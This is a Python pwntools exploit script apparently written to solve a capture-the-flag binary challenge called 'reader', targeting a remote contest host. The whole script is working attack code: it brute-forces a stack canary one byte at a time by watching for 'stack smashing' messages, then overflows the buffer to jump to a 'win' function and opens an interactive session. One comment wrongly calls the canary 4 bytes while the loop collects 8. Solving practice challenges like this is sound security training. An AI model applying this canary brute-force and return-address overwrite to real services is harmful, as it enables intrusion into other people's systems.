#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './reader'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
#lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#context.log_level = 'debug'
#context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = '0.cloud.chals.io', 10677

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# call to malloc
# breakrva 0x2be0

# breakrva 0x2c4f
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#[*] '/home/kali/Windows/USCCTF 2024/Readers/reader'
#    Arch:       amd64-64-little
#    RELRO:      Partial RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    SHSTK:      Enabled
#    IBT:        Enabled
#    Stripped:   No

def exploit():
    global io
    io = initialize()
    canary = b"\x00"
    rop = ROP(elf)
    while len(canary) < 8:  # Assuming the canary is 4 bytes long
        for i in range(0, 256):
            test_canary = canary + bytes([i])
            io.sendafter(b"data: ", cyclic(72) + test_canary)
            response = io.recvuntil("Enter")
            print(i)
#            sleep(0.1)
            if b"stack smashing" not in response:
                canary += bytes([i])
                log.success("Current Canary : %#x", int.from_bytes(canary, byteorder='big'))
                break
    io.sendafter("data: ", cyclic(72) + canary + p64(rop.ret.address) + p64(elf.sym["win"]))    
    
#    pause() if args.GDB else None
 
    io.interactive()
    
if __name__ == '__main__':
    exploit()
